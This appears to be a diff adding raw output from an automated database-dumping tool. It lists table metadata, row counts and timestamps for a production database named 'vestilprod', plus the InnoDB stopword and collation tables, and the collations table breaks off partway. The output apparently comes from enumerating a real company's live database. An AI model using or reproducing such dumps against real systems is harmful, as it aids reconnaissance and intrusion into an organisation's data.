+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16748692     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 2372             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | TABLE_PRIVILEGES                      | <blank>                       |
+| 0         | 0                   | <blank>    | <blank>    | 16384               | <blank>     | <blank>     | <blank>     | def          | <blank>      | <blank>      | <blank>       | <blank>             | 0               | <blank>         | TRIGGERS         | <blank>          | information_schema | <blank>           | <blank>             | <blank>              | 0                     | <blank>                 | <blank>                               | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16726092     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 1986             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | USER_PRIVILEGES                       | <blank>                       |
+| 0         | 0                   | <blank>    | <blank>    | 16384               | <blank>     | <blank>     | <blank>     | def          | <blank>      | <blank>      | <blank>       | <blank>             | 0               | <blank>         | VIEWS            | <blank>          | information_schema | <blank>           | <blank>             | <blank>              | 0                     | <blank>                 | <blank>                               | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16746784     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 31244            | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_LOCKS                          | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16746912     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 4536             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_TRX                            | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16773779     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 12007            | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_SYS_DATAFILES                  | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16705332     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 1163             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_FT_CONFIG                      | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 11883850     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 17               | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_SYS_VIRTUAL                    | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 13107200     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 25               | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_CMP                            | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 9437184      | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 9                | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_FT_BEING_DELETED               | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 13107200     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 25               | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_CMP_RESET                      | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16728660     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 1755             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_CMP_PER_INDEX                  | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 15204352     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 29               | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_CMPMEM_RESET                   | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 9437184      | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 9                | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_FT_DELETED                     | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16765866     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 6669             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_BUFFER_PAGE_LRU                | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16749238     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 599              | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_LOCK_WAITS                     | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16694643     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 1011             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_TEMP_TABLE_INFO                | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16615548     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 618              | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_SYS_INDEXES                    | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16736364     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 2091             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_SYS_TABLES                     | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16609428     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 594              | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_SYS_FIELDS                     | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16728660     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 1755             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_CMP_PER_INDEX_RESET            | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16766844     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 6852             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_BUFFER_PAGE                    | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 14680064     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 56               | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_FT_DEFAULT_STOPWORD            | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16744898     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 1054             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_FT_INDEX_TABLE                 | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16744898     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 1054             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_FT_INDEX_CACHE                 | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16752582     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 2133             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_SYS_TABLESPACES                | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16742448     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 2994             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_METRICS                        | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16738848     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 1748             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_SYS_FOREIGN_COLS               | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 15204352     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 29               | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_CMPMEM                         | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16332350     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 257              | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_BUFFER_POOL_STATS              | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16613350     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 610              | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_SYS_COLUMNS                    | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16700064     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 1752             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_SYS_FOREIGN                    | <blank>                       |
+| 0         | 2024-06-22 13:25:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | 16763355     | <blank>      | <blank>      | <blank>       | <blank>             | <blank>         | <blank>         | 1215             | <blank>          | def                | <blank>           | <blank>             | information_schema   | 0                     | <blank>                 | INNODB_SYS_TABLESTATS                 | <blank>                       |
+| 294912    | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 49152       | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | 360pic              | def             | <blank>         | <blank>          | <blank>          | 800                | <blank>           | <blank>             | 368                  | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 344064    | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | Casters             | def             | <blank>         | <blank>          | <blank>          | 435                | <blank>           | <blank>             | 790                  | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 3686400   | 2024-06-12 10:03:35 | <blank>    | <blank>    | 0                   | 49152       | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 2537             | <blank>          | 1453               | <blank>           | <blank>             | 2024-06-20 09:27:47  | vestilprod            | <blank>                 | Category                              | <blank>                       |
+| 16384     | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 32768       | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | Cats                | def             | <blank>         | <blank>          | <blank>          | 174                | <blank>           | <blank>             | 94                   | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 16384     | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | Color               | def             | <blank>         | <blank>          | <blank>          | 128                | <blank>           | <blank>             | 128                  | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 540672    | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 326              | <blank>          | 1654               | <blank>           | <blank>             | 2024-06-20 14:09:50  | vestilprod            | <blank>                 | ExtBody                               | <blank>                       |
+| 212992    | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 16384       | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 267              | <blank>          | 797                | <blank>           | <blank>             | 2024-06-20 16:01:20  | vestilprod            | <blank>                 | FAQ                                   | <blank>                       |
+| 16384     | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | Family              | def             | <blank>         | <blank>          | <blank>          | 2                  | <blank>           | <blank>             | 8192                 | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 4734976   | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 1589248     | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 141              | <blank>          | 33580              | <blank>           | <blank>             | 2024-06-20 08:30:37  | vestilprod            | <blank>                 | Images                                | <blank>                       |
+| 16384     | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | IndustryCat         | def             | <blank>         | <blank>          | <blank>          | 19                 | <blank>           | <blank>             | 862                  | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 1523712   | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 50790            | <blank>          | 30                 | <blank>           | <blank>             | 2024-06-18 13:01:12  | vestilprod            | <blank>                 | Jobs                                  | <blank>                       |
+| 98304     | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 438              | <blank>          | 224                | <blank>           | <blank>             | 2024-06-17 15:22:55  | vestilprod            | <blank>                 | Mailing                               | <blank>                       |
+| 5783552   | 2024-05-31 07:47:08 | <blank>    | <blank>    | 0                   | 1589248     | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 180              | <blank>          | 32108              | <blank>           | <blank>             | 2024-06-21 17:00:18  | vestilprod            | <blank>                 | NonCatalogInventoryAdvice             | <blank>                       |
+| 5783552   | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 433              | <blank>          | 13333              | <blank>           | <blank>             | 2024-06-21 12:51:24  | vestilprod            | <blank>                 | ProductData                           | <blank>                       |
+| 43012     | 2024-02-16 11:18:31 | <blank>    | <blank>    | 2022-08-10 12:14:15 | 82248       | <blank>     | <blank>     | 2048         | <blank>      | <blank>      | <blank>       | 2024-01-30 15:48:17 | 281474976710655 | <blank>         | vestilprod       | <blank>          | <blank>            | <blank>           | SDS                 | 40                   | def                   | <blank>                 | 980                                   | <blank>                       |
+| 114688    | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 114688      | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 63               | <blank>          | 1813               | <blank>           | <blank>             | 2024-05-14 08:56:36  | vestilprod            | <blank>                 | SDSModels                             | <blank>                       |
+| 1589248   | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 3932160     | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 105              | <blank>          | 15064              | <blank>           | <blank>             | 2024-06-21 16:05:18  | vestilprod            | <blank>                 | SKU                                   | <blank>                       |
+| 14472     | 2024-02-16 11:23:29 | <blank>    | <blank>    | 2021-04-14 14:51:39 | 46900       | <blank>     | <blank>     | 4096         | <blank>      | <blank>      | <blank>       | 2024-06-20 09:40:46 | 281474976710655 | <blank>         | vestilprod       | <blank>          | <blank>            | <blank>           | SND                 | 99                   | def                   | <blank>                 | 327                                   | <blank>                       |
+| 20512768  | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 1589248     | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 1527             | <blank>          | 13427              | <blank>           | <blank>             | 2024-06-21 13:40:37  | vestilprod            | <blank>                 | Syndigo-Test                          | <blank>                       |
+| 20512768  | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 1589248     | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | Syndigo-Test_bk     | def             | <blank>         | <blank>          | <blank>          | 13616              | <blank>           | <blank>             | 1506                 | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 11026432  | 2024-05-14 10:09:47 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 10106            | <blank>          | 1091               | <blank>           | <blank>             | 2024-06-21 11:36:20  | vestilprod            | <blank>                 | Tabs                                  | <blank>                       |
+| 16384     | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | WGI                 | def             | <blank>         | <blank>          | <blank>          | 22                 | <blank>           | <blank>             | 744                  | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 5783552   | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | catalogs            | def             | <blank>         | <blank>          | <blank>          | 55674              | <blank>           | <blank>             | 103                  | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 0         | 2024-04-10 14:04:34 | <blank>    | <blank>    | 2023-02-16 14:13:02 | 5063776     | <blank>     | <blank>     | 466944       | <blank>      | <blank>      | <blank>       | 2024-06-13 14:34:07 | 281474976710655 | <blank>         | vestilprod       | <blank>          | <blank>            | <blank>           | certificates        | 16710                | def                   | <blank>                 | 303                                   | <blank>                       |
+| 0         | 2024-04-10 14:04:34 | <blank>    | <blank>    | 2023-02-16 14:12:59 | 2107976     | <blank>     | <blank>     | 326656       | <blank>      | <blank>      | <blank>       | 2024-06-17 14:28:29 | 281474976710655 | <blank>         | vestilprod       | <blank>          | <blank>            | <blank>           | drawings            | 8373                 | def                   | <blank>                 | 251                                   | <blank>                       |
+| 180224    | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | industry            | def             | <blank>         | <blank>          | <blank>          | 512                | <blank>           | <blank>             | 352                  | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 0         | 2021-12-22 10:00:30 | <blank>    | <blank>    | 2019-07-22 11:41:24 | 274628      | <blank>     | <blank>     | 10240        | <blank>      | <blank>      | <blank>       | 2024-06-14 14:22:09 | 281474976710655 | <blank>         | vestilprod       | <blank>          | <blank>            | <blank>           | manuals             | 777                  | def                   | <blank>                 | 353                                   | <blank>                       |
+| 0         | 2021-12-22 10:00:31 | <blank>    | <blank>    | 2019-09-13 13:45:55 | 20628       | <blank>     | <blank>     | 2048         | <blank>      | <blank>      | <blank>       | 2024-05-10 10:38:50 | 281474976710655 | <blank>         | vestilprod       | <blank>          | <blank>            | <blank>           | surveys             | 127                  | def                   | <blank>                 | 162                                   | <blank>                       |
+| 19480576  | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | syndigo             | def             | <blank>         | <blank>          | <blank>          | 15919              | <blank>           | <blank>             | 1223                 | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 16384     | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | vback               | def             | <blank>         | <blank>          | <blank>          | 27                 | <blank>           | <blank>             | 606                  | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 1589248   | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 2330             | <blank>          | 682                | <blank>           | <blank>             | 2024-05-31 08:15:43  | vestilprod            | <blank>                 | vcasters                              | <blank>                       |
+| 65536     | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 157              | <blank>          | 416                | <blank>           | <blank>             | 2024-06-19 07:32:28  | vestilprod            | <blank>                 | vemployee                             | <blank>                       |
+| 163840    | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | vestilian           | def             | <blank>         | <blank>          | <blank>          | 28                 | <blank>           | <blank>             | 5851                 | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 4734976   | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | vleadtime           | def             | <blank>         | <blank>          | <blank>          | 30604              | <blank>           | <blank>             | 154                  | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 4734976   | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 159              | <blank>          | 29650              | <blank>           | <blank>             | 2024-05-15 10:31:04  | vestilprod            | <blank>                 | vleadtime_test                        | <blank>                       |
+| 16384     | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | vmatrix             | def             | <blank>         | <blank>          | <blank>          | 3                  | <blank>           | <blank>             | 5461                 | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 65536     | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 132              | <blank>          | 494                | <blank>           | <blank>             | 2024-06-18 15:37:40  | vestilprod            | <blank>                 | vnewprod                              | <blank>                       |
+| 540672    | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 327680      | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 38               | <blank>          | 14201              | <blank>           | <blank>             | 2024-06-21 12:48:22  | vestilprod            | <blank>                 | voption                               | <blank>                       |
+| 65536     | 2024-04-04 10:56:31 | <blank>    | <blank>    | 0                   | 16384       | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 336              | <blank>          | 195                | <blank>           | <blank>             | 2024-05-01 10:43:16  | vestilprod            | <blank>                 | voverstock                            | <blank>                       |
+| 1589248   | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | vquickship          | def             | <blank>         | <blank>          | <blank>          | 12420              | <blank>           | <blank>             | 127                  | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
+| 16384     | 2024-04-18 08:50:53 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | <blank>             | def             | <blank>         | 315              | <blank>          | 52                 | <blank>           | <blank>             | 2024-04-29 12:28:27  | vestilprod            | <blank>                 | vspecials                             | <blank>                       |
+| 81920     | 2024-01-21 12:51:38 | <blank>    | <blank>    | 0                   | 0           | <blank>     | <blank>     | <blank>      | <blank>      | <blank>      | <blank>       | zks-proposal1       | def             | <blank>         | <blank>          | <blank>          | 769                | <blank>           | <blank>             | 106                  | vestilprod            | <blank>                 | <blank>                               | <blank>                       |
++-----------+---------------------+------------+------------+---------------------+-------------+-------------+-------------+--------------+--------------+--------------+---------------+---------------------+-----------------+-----------------+------------------+------------------+--------------------+-------------------+---------------------+----------------------+-----------------------+-------------------------+---------------------------------------+-------------------------------+
+
+Database: information_schema
+Table: INNODB_FT_DEFAULT_STOPWORD
+[36 entries]
++---------+
+| value   |
++---------+
+| a       |
+| about   |
+| an      |
+| are     |
+| as      |
+| at      |
+| be      |
+| by      |
+| com     |
+| de      |
+| en      |
+| for     |
+| from    |
+| how     |
+| i       |
+| in      |
+| is      |
+| it      |
+| la      |
+| of      |
+| on      |
+| or      |
+| that    |
+| the     |
+| the     |
+| this    |
+| to      |
+| und     |
+| was     |
+| what    |
+| when    |
+| where   |
+| who     |
+| will    |
+| with    |
+| www     |
++---------+
+
+Database: information_schema
+Table: COLLATIONS
+[222 entries]
++-----+---------+------------+-------------+--------------------------+--------------------+
+| ID  | SORTLEN | IS_DEFAULT | IS_COMPILED | COLLATION_NAME           | CHARACTER_SET_NAME |
++-----+---------+------------+-------------+--------------------------+--------------------+
+| 1   | 1       | Yes        | Yes         | big5_chinese_ci          | big5               |
+| 84  | 1       | <blank>    | Yes         | big5_bin                 | big5               |
+| 3   | 1       | Yes        | Yes         | dec8_swedish_ci          | dec8               |
+| 69  | 1       | <blank>    | Yes         | dec8_bin                 | dec8               |
+| 4   | 1       | Yes        | Yes         | cp850_general_ci         | cp850              |
+| 80  | 1       | <blank>    | Yes         | cp850_bin                | cp850              |
+| 6   | 1       | Yes        | Yes         | hp8_english_ci           | hp8                |
+| 72  | 1       | <blank>    | Yes         | hp8_bin                  | hp8                |
+| 7   | 1       | Yes        | Yes         | koi8r_general_ci         | koi8r              |
+| 74  | 1       | <blank>    | Yes         | koi8r_bin                | koi8r              |
+| 5   | 1       | <blank>    | Yes         | latin1_german1_ci        | latin1             |
+| 8   | 1       | Yes        | Yes         | latin1_swedish_ci        | latin1             |
+| 15  | 1       | <blank>    | Yes         | latin1_danish_ci         | latin1             |
+| 31  | 2       | <blank>    | Yes         | latin1_german2_ci        | latin1             |
+| 47  | 1       | <blank>    | Yes         | latin1_bin               | latin1             |
+| 48  | 1       | <blank>    | Yes         | latin1_general_ci        | latin1             |
+| 49  | 1       | <blank>    | Yes         | latin1_general_cs        | latin1             |
+| 94  | 1       | <blank>    | Yes         | latin1_spanish_ci        | latin1             |
+| 2   | 4       | <blank>    | Yes         | latin2_czech_cs          | latin2             |
+| 9   | 1       | Yes        | Yes         | latin2_general_ci        | latin2             |
+| 21  | 1       | <blank>    | Yes         | latin2_hungarian_ci      | latin2             |
+| 27  | 1       | <blank>    | Yes         | latin2_croatian_ci       | latin2             |
+| 77  | 1       | <blank>    | Yes         | latin2_bin               | latin2             |
+| 10  | 1       | Yes        | Yes         | swe7_swedish_ci          | swe7               |
+| 82  | 1       | <blank>    | Yes         | swe7_bin                 | swe7               |
+| 11  | 1       | Yes        | Yes         | ascii_general_ci         | ascii              |
+| 65  | 1       | <blank>    | Yes         | ascii_bin                | ascii              |
+| 12  | 1       | Yes        | Yes         | ujis_japanese_ci         | ujis               |
+| 91  | 1       | <blank>    | Yes         | ujis_bin                 | ujis               |
+| 13  | 1       | Yes        | Yes         | sjis_japanese_ci         | sjis               |
+| 88  | 1       | <blank>    | Yes         | sjis_bin                 | sjis               |
+| 16  | 1       | Yes        | Yes         | hebrew_general_ci        | hebrew             |
+| 71  | 1       | <blank>    | Yes         | hebrew_bin               | hebrew             |
+| 18  | 4       | Yes        | Yes         | tis620_thai_ci           | tis620             |
+| 89  | 1       | <blank>    | Yes         | tis620_bin               | tis620             |
+| 19  | 1       | Yes        | Yes         | euckr_korean_ci          | euckr              |
+| 85  | 1       | <blank>    | Yes         | euckr_bin                | euckr              |
+| 22  | 1       | Yes        | Yes         | koi8u_general_ci         | koi8u              |
+| 75  | 1       | <blank>    | Yes         | koi8u_bin                | koi8u              |
+| 24  | 1       | Yes        | Yes         | gb2312_chinese_ci        | gb2312             |
+| 86  | 1       | <blank>    | Yes         | gb2312_bin               | gb2312             |
+| 25  | 1       | Yes        | Yes         | greek_general_ci         | greek              |
+| 70  | 1       | <blank>    | Yes         | greek_bin                | greek              |
+| 26  | 1       | Yes        | Yes         | cp1250_general_ci        | cp1250             |
+| 34  | 2       | <blank>    | Yes         | cp1250_czech_cs          | cp1250             |
+| 44  | 1       | <blank>    | Yes         | cp1250_croatian_ci       | cp1250             |
+| 66  | 1       | <blank>    | Yes         | cp1250_bin               | cp1250             |
+| 99  | 1       | <blank>    | Yes         | cp1250_polish_ci         | cp1250             |
+| 28  | 1       | Yes        | Yes         | gbk_chinese_ci           | gbk                |
+| 87  | 1       | <blank>    | Yes         | gbk_bin                  | gbk                |
+| 30  | 1       | Yes        | Yes         | latin5_turkish_ci        | latin5             |
+| 78  | 1       | <blank>    | Yes         | latin5_bin               | latin5             |
+| 32  | 1       | Yes        | Yes         | armscii8_general_ci      | armscii8           |
